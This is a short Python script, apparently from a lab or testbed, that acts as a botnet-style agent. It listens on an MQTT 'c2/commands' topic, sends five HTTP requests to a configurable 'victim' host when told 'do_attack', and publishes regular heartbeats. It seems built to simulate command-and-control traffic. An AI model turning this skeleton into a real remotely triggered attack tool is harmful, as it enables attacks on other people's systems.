import os, time, json, requests
import paho.mqtt.client as mqtt

BROKER_HOST = os.getenv("BROKER_HOST", "localhost")
BROKER_PORT = int(os.getenv("BROKER_PORT", "1883"))
VICTIM_HOST = os.getenv("VICTIM_HOST", "localhost")
CLIENT_ID   = os.getenv("CLIENT_ID", "c2-server")

def on_connect(client, userdata, flags, rc):
    print(f"MQTT on_connect rc={rc}")
    client.subscribe("c2/commands")

def on_message(client, userdata, msg):
    payload = msg.payload.decode("utf-8", errors="ignore").strip()
    print(f"Command received: {payload}")
    if payload == "do_attack":
        try:
            for i in range(5):
                url = f"http://{VICTIM_HOST}:8080"
                r = requests.get(url, timeout=3)
                print(f"GET {i+1}/5 -> {r.status_code} ({url})")
                time.sleep(0.3)
        except Exception as e:
            print(f"attack error: {e}")

client = mqtt.Client(client_id=CLIENT_ID)
client.on_connect = on_connect
client.on_message = on_message

while True:
    try:
        client.connect(BROKER_HOST, BROKER_PORT, keepalive=30)
        break
    except Exception as e:
        print(f"connect failed: {e}; retrying in 2s")
        time.sleep(2)

client.loop_start()
while True:
    client.publish("devices/heartbeat", json.dumps({"src":"c2","ts":time.time()}), qos=0, retain=False)
    time.sleep(5)
